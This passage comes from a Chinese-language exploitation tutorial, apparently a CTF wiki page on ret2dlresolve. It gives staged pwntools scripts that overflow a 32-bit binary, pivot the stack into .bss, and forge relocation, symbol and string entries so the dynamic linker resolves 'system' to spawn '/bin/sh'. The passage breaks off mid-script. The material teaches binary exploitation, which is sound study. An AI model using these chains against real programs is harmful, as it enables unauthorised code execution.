<p>在这一阶段，我们将会利用 dlresolve 相关的知识来控制程序执行 write 函数。这里我们主要是利用 plt[0] 中的相关指令，即 GOT[2] push linkmap 以及跳转到 dl_resolve 函数中解析的指令。此外，我们还得单独提供一个 write 重定位项在 plt 表中的偏移。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
<span class="n">base_stage</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="n">stack_size</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">112</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1"># stack pivoting, set esp = base_stage
</span><span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>


<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="s">"/bin/sh"</span>
<span class="n">plt0</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.plt'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">write_index</span> <span class="o">=</span> <span class="p">((</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span> <span class="o">-</span> <span class="n">plt0</span><span class="p">)</span> <span class="o">/</span> <span class="mi">16</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">write_index</span><span class="p">)</span>
<span class="c1">## fake ret addr of write
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sh</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
<span class="c1">#s.recv()
</span>
<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="stage-3">STAGE 3</h2>

<p>这一次，我们同样控制 dl_resolve 函数中的 index_offset 参数，不过这次控制其指向我们伪造的 write 重定位项。脚本如下：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="c1"># 自定义stack size
</span><span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
<span class="n">base_stage</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="n">stack_size</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">112</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1"># stack pivoting，esp = base_stage
</span><span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="s">"/bin/sh"</span>
<span class="n">plt0</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.plt'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="c1"># push offset in PLT
</span><span class="n">write_index</span> <span class="o">=</span> <span class="p">((</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span> <span class="o">-</span> <span class="n">plt0</span><span class="p">)</span> <span class="o">/</span> <span class="mi">16</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span>
<span class="n">rel_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.rel.plt'</span><span class="p">)</span>
<span class="c1"># ELF_REL：r_offset and r_info of write@plt
</span><span class="n">r_offset</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">rel_plt</span><span class="o">.</span><span class="n">data</span><span class="p">()[</span><span class="n">write_index</span><span class="p">:</span><span class="n">write_index</span> <span class="o">+</span> <span class="mi">4</span><span class="p">])</span>
<span class="n">r_info</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">rel_plt</span><span class="o">.</span><span class="n">data</span><span class="p">()[</span><span class="n">write_index</span> <span class="o">+</span> <span class="mi">4</span><span class="p">:</span><span class="n">write_index</span> <span class="o">+</span> <span class="mi">8</span><span class="p">])</span>
<span class="c1"># fake reloc = base_stage + 24
</span><span class="n">index_offset</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">-</span> <span class="n">rel_plt</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>

<span class="c1"># args in dl_reslove
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
<span class="c1"># fake ret of write
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sh</span><span class="p">))</span>
<span class="c1"># fake reloc (offset 4*6=24)
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">r_offset</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">r_info</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
<span class="c1">#s.recv()
</span>
<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>最后结果如下，这次我们在 bss 段伪造了一个假的 write 的重定位项，仍然输出了对应的字符串。</p>

<p><img src="images/Snipaste_2019-03-06_15-18-15.png" alt="Snipaste_2019-03-06_15-18-15" /></p>

<h2 id="stage-4">STAGE 4</h2>

<p>stage3 中，我们控制了重定位表项，但是重定位表项的内容与 write 原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。
首先，我们根据 write 的重定位表项的 r_info=0x607 可以知道，write 对应的符号在符号表的下标为 0x607»8=0x6。因此，我们知道 write 对应的符号地址为 0x8048238。</p>

<p><img src="images/Snipaste_2019-03-06_15-41-36.png" alt="Snipaste_2019-03-06_15-41-36" /></p>

<p><img src="images/Snipaste_2019-03-06_15-44-21.png" alt="Snipaste_2019-03-06_15-44-21" /></p>

<p>通过伪造fake .dynsym和fake .rel.plt</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="c1"># stack size
</span><span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
<span class="n">base_stage</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="n">stack_size</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">112</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1"># stack pivoting，esp = base_stage
</span><span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="s">"/bin/sh"</span>
<span class="n">plt0</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.plt'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">rel_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.rel.plt'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">dynsym</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.dynsym'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">dynstr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.dynstr'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>

<span class="c1"># fake sym
</span><span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">32</span>
<span class="c1"># size of item(Elf32_Symbol) of dynsym is 0x10
</span><span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span>  
<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="n">align</span>

<span class="c1"># dynsym index of sym
</span><span class="n">index_dynsym</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10</span>
<span class="c1"># fake item(write) of .dynsym
</span><span class="n">fake_write_sym</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="mh">0x4c</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">])</span>

<span class="c1"># fake write relocation
</span><span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
<span class="n">fake_write_reloc</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">],</span> <span class="n">r_info</span><span class="p">])</span>
<span class="c1"># fake reloc = base_stage + 24
</span><span class="n">index_offset</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">-</span> <span class="n">rel_plt</span>


<span class="c1"># args in dl_reslove
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
<span class="c1"># fake ret of write
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sh</span><span class="p">))</span>
<span class="c1"># fake reloc (offset 4*6=24)
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">fake_write_reloc</span><span class="p">)</span>
<span class="c1"># padding
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s">'a'</span> <span class="o">*</span> <span class="n">align</span><span class="p">)</span>
<span class="c1"># fake dynsym (align to 0x10)
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">fake_write_sym</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
<span class="c1">#s.recv()
</span>
<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="stage-5">STAGE 5</h2>

<p>这一阶段，我们将在阶段 4 的基础上，我们进一步使得 write 符号的 st_name 指向我们自己构造的字符串。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="c1"># stack size
</span><span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
<span class="n">base_stage</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="n">stack_size</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">112</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1"># stack pivoting，esp = base_stage
</span><span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>
<span class="n">plt0</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.plt'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">rel_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.rel.plt'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">dynsym</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.dynsym'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">dynstr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.dynstr'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>


<span class="c1"># 1. fake index to fake .rel.plt
</span><span class="n">index_offset</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">-</span> <span class="n">rel_plt</span>

<span class="c1"># 3. fake .dynsym
</span><span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">32</span>
<span class="c1"># size of item(Elf32_Symbol) of dynsym is 0x10
</span><span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span>  
<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="n">align</span>

<span class="c1"># 4. fake index to fake .dynstr
</span><span class="n">index_dynsym</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10</span>

<span class="c1"># 2. fake r_info in .rel.plt to fake .dynsym
</span><span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
<span class="n">fake_write_reloc</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">],</span> <span class="n">r_info</span><span class="p">])</span>

<span class="c1"># 5. fake st_name 
# 0x10 is the offset of fake_write_sym
</span><span class="n">st_name</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="n">dynstr</span>
<span class="n">fake_write_sym</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">st_name</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">])</span>


<span class="c1"># args in dl_reslove
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
<span class="c1"># fake ret of write
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span>
<span class="c1"># write(1, addr, len)
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sh</span><span class="p">))</span>
<span class="c1"># 1. fake .rel.plt (offset 4*6=24)
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">fake_write_reloc</span><span class="p">)</span>
<span class="c1"># padding
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s">'a'</span> <span class="o">*</span> <span class="n">align</span><span class="p">)</span>
<span class="c1"># 2. fake .dynsym (align to 0x10)
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">fake_write_sym</span><span class="p">)</span>
<span class="c1"># 3. fake .dynstr
</span><span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s">'write</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">generatePadding</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>

<span class="k">print</span> <span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">()</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
<span class="c1">#s.recv()
</span>
<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="stage-6">STAGE 6</h2>

<p>这一阶段，我们只需要将原先的 write 字符串修改为 system 字符串，同时修改 write 的参数为 system 的参数即可获取 shell。这是因为，dl_resolve 最终依赖的是我们所给定的字符串，即使我们给了一个假的字符串它仍然会去解析并执行。具体代码如下</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="c1"># stack size
</span><span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
<span class="n">base_stage</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span> <span class="o">+</span> <span class="n">stack_size</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">112</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1"># stack pivoting，esp = base_stage
</span><span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>

<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>
<span class="n">plt0</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.plt'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">rel_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.rel.plt'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">dynsym</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.dynsym'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">dynstr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s">'.dynstr'</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>


<span class="c1"># 1. fake index to fake .rel.plt
</span><span class="n">index_offset</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">-</span> <span class="n">rel_plt</span>

<span class="c1"># 3. fake .dynsym
</span><span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">32</span>
<span class="c1"># size of item(Elf32_Symbol) of dynsym is 0x10
</span><span class="n">align</span> <span class="o">=</span> <span class="mh">0x10</span> <span class="o">-</span> <span class="p">((</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">)</span>  
<span class="n">fake_sym_addr</span> <span class="o">=</span> <span class="n">fake_sym_addr</span> <span class="o">+</span> <span class="n">align</span>

<span class="c1"># 4. fake index to fake .dynstr
</span><span class="n">index_dynsym</span> <span class="o">=</span> <span class="p">(</span><span class="n">fake_sym_addr</span> <span class="o">-</span> <span class="n">dynsym</span><span class="p">)</span> <span class="o">/</span> <span class="mh">0x10</span>

<span class="c1"># 2. fake r_info in .rel.plt to fake .dynsym
</span><span class="n">r_info</span> <span class="o">=</span> <span class="p">(</span><span class="n">index_dynsym</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x7</span>
